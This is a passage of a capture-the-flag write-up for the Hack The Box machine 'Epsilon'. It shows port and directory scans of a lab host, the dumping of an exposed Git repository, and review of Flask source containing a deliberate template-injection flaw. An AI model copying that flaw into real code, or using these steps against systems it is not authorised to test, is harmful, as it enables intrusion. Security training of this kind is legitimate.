@@ -1,0 +1,753 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Epsilon</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-epsilon">htb-epsilon</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#git-dumper">git-dumper</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#flask">flask</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#aws">aws</a> <a class="post-tag" href="/tags#awscli">awscli</a> <a class="post-tag" href="/tags#aws-lambda">aws-lambda</a> <a class="post-tag" href="/tags#htb-gobox">htb-gobox</a> <a class="post-tag" href="/tags#htb-bolt">htb-bolt</a> <a class="post-tag" href="/tags#htb-bucket">htb-bucket</a> <a class="post-tag" href="/tags#jwt">jwt</a> <a class="post-tag" href="/tags#ssti">ssti</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#pspy">pspy</a> <a class="post-tag" href="/tags#timing-attack">timing-attack</a> <a class="post-tag" href="/tags#cron">cron</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-03-10T10:00:00+00:00" itemprop="datePublished">Mar 10, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/03/10/htb-epsilon.html" style="color: #e6e6e6; text-decoration: none;">HTB: Epsilon</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/epsilon-cover.webp" type="image/webp"/>
+<img alt="Epsilon" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/epsilon-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Epsilon originally released in the 2021 HTB University CTF, but later released on HTB for others to play. In this box, I’ll start by finding an exposed git repo on the webserver, and use that to find source code for the site, including the AWS keys. Those keys get access to lambda functions which contain a secret that is reused as the secret for the signing of JWT tokens on the site. With that secret, I’ll get access to the site and abuse a server-side template injection to get execution and an initial shell. To escalate to root, there’s a backup script that is creating tar archives of the webserver which I can abuse to get a copy of root’s home directory, including the flag and an SSH key for shell access.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/442 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/epsilon" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Epsilon</a> <a href="https://hackthebox.com/machines/epsilon" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-epsilon.webp" type="image/webp"/> <img alt="Epsilon" class="img-av" src="/icons/box-epsilon.png"/></picture></a><br/><a href="https://hackthebox.com/machines/epsilon" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1491080394342600706">07 Feb 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">07 Feb 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13531" rel="noopener" target="_blank"><img alt="MrR3boot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13531" style="display: unset"/><span class="user-text" style="display: none"> MrR3boot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22), HTTP hosted by Apache (80), and HTTP hosted by Python (5000):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.134
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-09 17:58 UTC
+Nmap scan report for 10.10.11.134
+Host is up (0.062s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,5000 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.134
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-09 18:07 UTC
+Nmap scan report for 10.10.11.134
+Host is up (0.019s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41
+| http-git: 
+|   10.10.11.134:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: 403 Forbidden
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Costume Shop
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 20.04 focal.</p>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> also identified a Git repo on the port 80 site, which I’ll definitely want to check out.</p>
+<h3 id="website---tcp-5000">Website - TCP 5000</h3>
+<h4 id="site">Site</h4>
+<p>The page is for a costume shop:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309131735079.webp" type="image/webp"/>
+<img alt="image-20220309131735079" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309131735079.png"/>
+</picture>
+<p>Some basic guesses like “admin” / “admin” don’t work, and simple SQL injections don’t show anything useful either.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP headers show what <code class="language-plaintext highlighter-rouge">nmap</code> already identified, that the site is hosted using Python:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.0</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3550</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Werkzeug/2.0.2 Python/3.8.10</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 09 Mar 2022 18:22:20 GMT</span>
+</code></pre></div></div>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> here with no extensions (because it’s Python):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.134:5000
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.5.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.134:5000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.5.0
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        4l       24w      208c http://10.10.11.134:5000/home =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.134:5000/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        4l       24w      208c http://10.10.11.134:5000/order =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.134:5000/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      234l      454w     4288c http://10.10.11.134:5000/track
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m     29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:3       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   487/s   http://10.10.11.134:5000 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home</code> and <code class="language-plaintext highlighter-rouge">/order</code> both redirect to the root page which gives the login form. This makes sense for a site that wants auth to access the other pages.</p>
+<p><code class="language-plaintext highlighter-rouge">/track</code> returns 200 OK.</p>
+<h4 id="track">/track</h4>
+<p><code class="language-plaintext highlighter-rouge">/track</code> presents a page for tracking orders, including welcoming me as admin:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309132355405.webp" type="image/webp"/>
+<img alt="image-20220309132355405" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309132355405.png"/>
+</picture>
+<p>Every link on this page (including the “Track” button which sends a post to <code class="language-plaintext highlighter-rouge">/track</code>) results in a 302 redirect back to the root login form. I suspect this page wasn’t meant to be accessible.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site-1">Site</h4>
+<p>Trying to visit this site just returns a standard Apache 403 Forbidden page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220309131528209.webp" type="image/webp"/>
+<img alt="image-20220309131528209" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220309131528209.png"/>
+</picture>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>The response headers don’t give any additional information:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">403</span> <span class="ne">Forbidden</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 09 Mar 2022 18:19:09 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.41 (Ubuntu)</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">277</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=iso-8859-1</span>
+</code></pre></div></div>
+<h4 id="directory-brute-force-1">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, but it doesn’t find anything other than the standard Apache <code class="language-plaintext highlighter-rouge">server-status</code> page, which returns 403:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.134
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.5.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.134
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.5.0
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c http://10.10.11.134/server-status
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 18s    29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:1       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 17s    29999/29999   1726/s  http://10.10.11.134
+</span></code></pre></div></div>
+<h3 id="git-repo">Git Repo</h3>
+<h4 id="dump">Dump</h4>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> pointed out that there was a <code class="language-plaintext highlighter-rouge">.git</code> folder on port 80’s webserver. I’ll use <a href="https://github.com/internetwache/GitTools">GitTools</a> <code class="language-plaintext highlighter-rouge">gitdumper.sh</code> to pull the repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>/opt/GitTools/Dumper/gitdumper.sh http://10.10.11.134/.git/ <span class="nb">.</span>
+<span class="c">###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#                                           
+# Developed and maintained by @gehaxelt from @internetwache
+#                                              
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########                   
+</span><span class="go">
+
+[*] Destination folder does not exist
+[+] Creating ./.git/                   
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description                        
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+...[snip]...
+[+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630
+[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca
+[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 12
+drwxrwx--- 1 root vboxsf 4096 Mar  9 19:18 .
+drwxrwx--- 1 root vboxsf 4096 Mar  9 19:16 ..
+drwxrwx--- 1 root vboxsf 4096 Mar  9 19:18 .git
+</span></code></pre></div></div>
+<p>It creates a <code class="language-plaintext highlighter-rouge">.git</code> directory, which is how Git repos are stored on disk.</p>
+<h4 id="recover-source-code">Recover Source Code</h4>
+<p>If I run <code class="language-plaintext highlighter-rouge">git status</code>, it shows two deleted files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">On branch master
+Changes not staged for commit:
+  (use "git add/rm &lt;file&gt;..." to update what will be committed)
+  (use "git restore &lt;file&gt;..." to discard changes in working directory)
+        deleted:    server.py
+        deleted:    track_api_CR_148.py
+
+no changes added to commit (use "git add" and/or "git commit -a")
+</span></code></pre></div></div>
+<p>That’s because the last commit had those files, and now they are not present, so <code class="language-plaintext highlighter-rouge">git</code> thinks they must have been deleted. <code class="language-plaintext highlighter-rouge">git reset --hard</code> will put things back as they were at the last commit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git reset <span class="nt">--hard</span>
+<span class="go">HEAD is now at c622771 Fixed Typo
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">On branch master
+nothing to commit, working tree clean
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+-rw-rw-r-- 1 oxdf oxdf 1670 Mar  9 19:23 server.py
+-rw-rw-r-- 1 oxdf oxdf 1099 Mar  9 19:23 track_api_CR_148.py
+</span></code></pre></div></div>
+<h4 id="source-analysis---serverpy">Source Analysis - server.py</h4>
+<p><code class="language-plaintext highlighter-rouge">server.py</code> is a Flask application that defines four routes, <code class="language-plaintext highlighter-rouge">/</code>, <code class="language-plaintext highlighter-rouge">/home</code>, <code class="language-plaintext highlighter-rouge">/track</code>, and <code class="language-plaintext highlighter-rouge">/order</code>. All by <code class="language-plaintext highlighter-rouge">/</code> call <code class="language-plaintext highlighter-rouge">verify_jwt</code> with the provided cookie and redirect to <code class="language-plaintext highlighter-rouge">/</code> if it doesn’t return true. For example:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+        <span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
+                <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">home.html</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">verify_jet</code> uses the <a href="https://pyjwt.readthedocs.io/en/stable/">PyJWT library</a> with a secret that is obfuscated in this code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;secret_key&gt;</span><span class="sh">'</span>
+
+<span class="k">def</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">username</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">HS256</span><span class="sh">'</span><span class="p">,])[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
+                <span class="k">if</span> <span class="n">username</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="bp">True</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">except</span><span class="p">:</span>
+                <span class="k">return</span> <span class="bp">False</span>
+</code></pre></div></div>
+<p>The login functions seems to suggest that username “admin” with password “admin” should work, but as it didn’t, something must have changed with this code as compared to the live site:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">:</span>
+                        <span class="n">res</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">()</span>
+                        <span class="n">username</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
+                        <span class="n">token</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">({</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
+                        <span class="n">res</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">"</span><span class="s">auth</span><span class="sh">"</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
+                        <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">location</span><span class="sh">'</span><span class="p">]</span><span class="o">=</span><span class="sh">'</span><span class="s">/home</span><span class="sh">'</span>
+                        <span class="k">return</span> <span class="n">res</span><span class="p">,</span><span class="mi">302</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">/track</code> route also doesn’t require auth for a GET, but does for a POST:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/track</span><span class="sh">"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">track</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
+                <span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
+                        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/order</code> seems to have a server-side template injection (SSTI) vulnerability:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/order</span><span class="sh">'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
+        <span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
+                        <span class="n">costume</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">"</span><span class="s">costume</span><span class="sh">"</span><span class="p">]</span>
+                        <span class="n">message</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+                        Your order of </span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s"> has been placed successfully.
+                        </span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">costume</span><span class="p">)</span>
+                        <span class="n">tmpl</span><span class="o">=</span><span class="nf">render_template_string</span><span class="p">(</span><span class="n">message</span><span class="p">,</span><span class="n">costume</span><span class="o">=</span><span class="n">costume</span><span class="p">)</span>
+                        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="n">tmpl</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</code></pre></div></div>
+<p>It is taking user input (the <code class="language-plaintext highlighter-rouge">costume</code> field from the input form), and passing that into <code class="language-plaintext highlighter-rouge">render_template_string</code>, which is a dangerous function. If I get authenticated access to the site, I’ll want to explore that further.</p>
+<h4 id="source-analysis---track_api_cr_148py">Source Analysis - track_api_CR_148.py</h4>
+<p>The other file is for interacting with an AWS instance:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">io</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">from</span> <span class="n">zipfile</span> <span class="kn">import</span> <span class="n">ZipFile</span>
+<span class="kn">from</span> <span class="n">boto3.session</span> <span class="kn">import</span> <span class="n">Session</span>
+
+
+<span class="n">session</span> <span class="o">=</span> <span class="nc">Session</span><span class="p">(</span>
+    <span class="n">aws_access_key_id</span><span class="o">=</span><span class="sh">'</span><span class="s">&lt;aws_access_key_id&gt;</span><span class="sh">'</span><span class="p">,</span>
+    <span class="n">aws_secret_access_key</span><span class="o">=</span><span class="sh">'</span><span class="s">&lt;aws_secret_access_key&gt;</span><span class="sh">'</span><span class="p">,</span>
+    <span class="n">region_name</span><span class="o">=</span><span class="sh">'</span><span class="s">us-east-1</span><span class="sh">'</span><span class="p">,</span>
+    <span class="n">endpoint_url</span><span class="o">=</span><span class="sh">'</span><span class="s">http://cloud.epsilon.htb</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">aws_lambda</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">client</span><span class="p">(</span><span class="sh">'</span><span class="s">lambda</span><span class="sh">'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">files_to_zip</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
